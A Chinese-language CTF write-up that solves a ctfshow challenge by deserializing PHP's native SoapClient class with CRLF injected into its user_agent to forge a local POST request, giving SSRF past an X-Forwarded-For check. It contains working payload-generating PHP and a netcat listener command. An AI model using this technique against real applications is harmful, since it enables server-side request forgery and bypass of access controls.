这道题学习SoapClient与CRLF组合拳

咱先学习学习啥是CRLF

一般遇到反序列化题目，而本身那个php页面没用任何已有的类，那么大概率就是考察php原生类的反序列化了。

代码

index.php

<?php

highlight_file(__FILE__);


$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();

flag.php

flag.php
<?php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
    die('error');
}else{
    $token = $_POST['token'];
    if($token=='ctfshow'){
        file_put_contents('flag.txt',$flag);
    }
}

分析：想要得到flag，必须本地访问flag.php并且带上token，由X-Forwarded-For来判断的，第一反应是改XFF头，看网上师傅说由于有cloudfare代理，是无法通过本地构造XFF头绕过的。所以需要利用原生类的反序列化来实现SSRF，考察php的SoapClient原生类的反序列化。

思路

  • php在安装php-soap扩展后，可以反序列化原生类SoapClient，来发送HTTP POST请求。
    触发条件：调用SoapClient不存在的方法，触发SoapClient的__call魔术方法

  • 通过CRLF来添加请求体：SoapClient可以指定请求的user-agent头，通过CRLF来加入其他请求内容，例如Content-Length，相当于注入构造完整POST包去向本地发送请求，超出Content-Length长度的内容变成第二个请求包。

解题步骤

  1. 这里站点指定了7777端口，先WSL本地监听试一下

    nc -lvvp 7777

    Payload

    <?php
    $post_msg="token=ctfshow";
    $user_agent="Rollinon^^X-Forwarded-For: 127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded^^Content-Length: ".strlen($post_msg)."^^^^".$post_msg;
    $uri="Rollinon";
    $target="http://127.0.0.1:7777/flag.php";
    $a=new SoapClient(
        null,
        array(
            'user_agent'=>$user_agent,
            'uri'=>$uri,
            'location'=>$target
        )
    );

    $b=serialize($a);
    $b=str_replace("^^","\r\n",$b);
    echo $b;
    $c=unserialize($b);
    $c->not_exists_function();

    输出：

    输出没啥问题

  2. 改改Payload，把端口去掉

    <?php
    $post_msg="token=ctfshow";
    $user_agent="Rollinon^^X-Forwarded-For: 127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded^^Content-Length: ".strlen($post_msg)."^^^^".$post_msg;
    $uri="Rollinon";
    $target="http://127.0.0.1/flag.php";
    $a=new SoapClient(
        null,
        array(
            'user_agent'=>$user_agent,
            'uri'=>$uri,
            'location'=>$target
        )
    );

    $b=serialize($a);
    $b=str_replace("^^","\r\n",$b);
    echo urlencode($b);
//    $c=unserialize($b);
//    $c->not_exists_function();

    输出

    Success！
